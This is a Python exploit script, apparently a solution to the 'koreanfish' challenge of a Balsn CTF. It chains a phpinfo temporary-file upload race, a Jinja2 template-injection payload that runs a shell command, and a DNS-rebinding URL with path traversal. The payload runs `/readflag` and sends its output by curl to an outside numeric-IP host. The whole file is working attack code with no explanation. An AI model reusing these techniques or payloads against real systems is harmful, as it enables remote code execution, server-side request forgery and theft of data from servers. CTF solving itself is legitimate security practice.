#!/usr/bin/env python
import socket
import requests
import os,sys,time
import re

# GLOBAL SETTINGS
########################################################
rcvbuf = 1024
bigz = 3000
junkheaders = 30
junkfiles = 40
junkfilename = '>' * 100000
########################################################

#######INIT
host = "koreanfish.balsnctf.com"
# host = "127.0.0.1"
path = "/phpinfo.php"
###########

z = "Z" * bigz
found = 0
headers = """POST %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7\r\nz:%s\r\n""" %(path,host,z)

loop = range(0,junkheaders)
for count in loop:
    headers = headers+"z%d: %d\r\n" %(count,count)

#print "\n%s\n" %headers
headers += """Content-Type: multipart/form-data; boundary=---------------------------59502863519624080131137623865\r\nContent-Length: """

content = ("""-----------------------------59502863519624080131137623865\r\nContent-Disposition: form-data; name="tfile"; filename="test.html"\r\nContent-Type: text/html\r\n\r\n2147483647\n"""
        +"""{% if ''['__class__']['__mro__'][1]['__subclasses__']()[409]['__init__']['__globals__']['__builtins__']['eval']('getattr(__import__("subprocess"),"check_output")("curl http://2356265544:5678/?flag=`/readflag`",shell=True)') %}1{% endif %}\r\n-----------------------------59502863519624080131137623865--""")

loop = range(0,junkfiles)
for count in loop:
    content = content + """-----------------------------59502863519624080131137623865\r\nContent-Disposition: form-data; name="ffile%d"; filename="%d%s"\r\nContent-Type: text/html\r\n\r\nno\r\n-----------------------------59502863519624080131137623865--\r\n""" %(count,count,junkfilename)

headers = headers+str(len(content))+"\r\n\r\n%s" %(content)

#print "[headers ready]"
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#sys.stdout.write("[*] Sending request\t\t")
print((host,80))
sock.connect((host,80))
#print "\n%s\n" %headers
sock.send(headers)
#print"[request sent]\n"
all_data = ""
running = 1
while "tmp_name" not in all_data:
    #sys.stdout.write('.')
    data = sock.recv(1024) # read 1024 byte chunks
    all_data = all_data + data
    
    if("tmp_name" in all_data and "/tmp/php" in all_data):
        found = 1
        #sys.stdout.write("\n[+] Got filename: ")
        fil = open("out.txt","w")
        fil.write(all_data)
        fil.close()
        
        for line in open("out.txt"):
            if "tmp_name]" in line:
                #print line
                mystr = str(line)
                array = mystr.split()
                tmp_name = array[2]
                print "%s" %tmp_name
                with open('tmp_webroot/koreafish.phtml', 'w') as ffff:
                    ffff.write("""
<?php
    header('Location: http://127.0.0.1:5000/error_page?err=../../../../..{}');
?>
                    """.format(tmp_name))
                break
    
        tmp_url = 'http://koreanfish.balsnctf.com/?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http%3A%2F%2FA.54.87.54.87.1time.140.113.194.72.1time.repeat.rebind.network%3A1234%2Fkoreafish.phtml'
        #print "%s" %tmp_url
        r = requests.get(tmp_url)
        content = r.content
        #print "%s\n" %content
        ofile = open("out.txt","w")
        ofile.write(content)
        ofile.close()
        # os.system("./phpinfo_ext")
        #print "%s\n" %content
        break
    
    if("PHP License" in all_data):
        break

sock.close()
print('found: %d' % (found))